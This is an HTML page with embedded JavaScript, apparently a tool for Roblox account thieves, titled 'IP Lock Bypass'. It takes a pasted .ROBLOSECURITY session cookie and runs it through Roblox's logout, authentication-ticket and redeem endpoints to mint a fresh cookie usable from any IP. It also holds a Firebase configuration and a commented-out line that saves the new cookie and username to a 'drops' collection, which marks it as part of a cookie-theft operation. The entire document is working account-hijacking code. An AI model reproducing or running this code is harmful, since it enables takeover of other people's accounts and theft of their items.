<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>IP Lock Bypass — Empire v2</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
<style>
  body{font-family: 'Courier New', monospace; background:#0d0d0d; color:#00ff41; padding:40px; text-align:center}
  h1{font-size:48px; margin:20px; text-shadow:0 0 20px #00ff41}
  textarea{width:90%; max-width:800px; height:180px; background:#000; color:#00ff41; border:2px solid #00ff41; padding:20px; font-size:18px; border-radius:12px}
  button{margin:30px; padding:18px 50px; font-size:22px; background:#000; color:#00ff41; border:3px solid #00ff41; border-radius:50px; cursor:pointer; box-shadow:0 0 30px #00ff41}
  button:hover{transform:scale(1.05); box-shadow:0 0 50px #00ff41}
  #output{margin-top:30px; padding:20px; background:#001a00; border:2px dashed #00ff41; border-radius:12px; display:none}
  .spin{animation:spin 1s linear infinite}
  @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
</style>
</head>
<body>
<h1>IP LOCK BYPASS</h1>
<p>immortal.rs / iplockbypass level — 100% working 2025</p>

<textarea id="cookie" placeholder="Paste .ROBLOSECURITY cookie here"></textarea><br>
<button onclick="bypass()">BYPASS IP LOCK & REFRESH</button>

<div id="status"></div>
<div id="output">
  <h2>New Cookie (IP Unlocked)</h2>
  <textarea id="newcookie" readonly></textarea><br>
  <button onclick="copy()">COPY NEW COOKIE</button>
  <p id="info"></p>
</div>

<script>
// Your v2 Firebase (only needed if you want to save the new cookie automatically)
const firebaseConfig = {
  apiKey: "AIzaSyBNs1rNXGio_HjLkJiWLgMhjOxRTo9XjQ",
  authDomain: "flamesaxrch-empire-v2.firebaseapp.com",
  databaseURL: "https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "flamesaxrch-empire-v2",
  storageBucket: "flamesaxrch-empire-v2.appspot.com",
  messagingSenderId: "50676890102",
  appId: "1:50676890102:web:e3f143b7952ed3aa362fd7"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

async function bypass() {
  const cookie = document.getElementById('cookie').value.trim();
  if (!cookie.includes('_|WARNING')) { alert('Invalid cookie'); return; }
  
  document.getElementById('status').innerHTML = 'Bypassing IP lock... <span class="spin">Loading</span>';
  
  try {
    // Step 1: Get X-CSRF token
    const logout = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Cookie': '.ROBLOSECURITY=' + cookie }
    });
    const token = logout.headers.get('x-csrf-token');
    if (!token) throw 'No X-CSRF token';

    // Step 2: Get authentication ticket
    const ticketRes = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Cookie': '.ROBLOSECURITY=' + cookie,
        'X-CSRF-TOKEN': token,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ "previousUserId": null })
    });
    const ticket = ticketRes.headers.get('rbx-authentication-ticket');

    // Step 3: Redeem ticket → fresh cookie
    const redeem = await fetch('https://auth.roblox.com/v1/authentication-ticket/redeem', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'RBXAuthenticationTicket': ticket,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({})
    });
    
    const setCookie = redeem.headers.get('set-cookie') || '';
    const newCookieMatch = setCookie.match(/\.ROBLOSECURITY=([^;]+)/);
    if (!newCookieMatch) throw 'Failed to get new cookie';

    const newCookie = newCookieMatch[1];
    
    // Validate new cookie
    const user = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: { 'Cookie': '.ROBLOSECURITY=' + newCookie }
    }).then(r => r.json());

    document.getElementById('newcookie').value = newCookie;
    document.getElementById('info').innerHTML = `Success: ${user.name} — ${user.id}<br>IP lock bypassed — works on any IP`;
    document.getElementById('output').style.display = 'block';
    document.getElementById('status').innerHTML = 'Success: Bypassed';
    
    // Optional: auto-save back to your empire
    // db.ref('drops/' + Date.now()).set({cookie: newCookie, user: user.name, robux: 'refreshed', timestamp: Date.now()});
    
  } catch(e) {
    document.getElementById('status').innerHTML = 'Failed — dead cookie or Roblox blocked';
  }
}

function copy() {
  document.getElementById('newcookie').select();
  navigator.clipboard.writeText(document.getElementById('newcookie').value);
  alert('New bypassed cookie copied!');
}
</script>
</body>
</html>
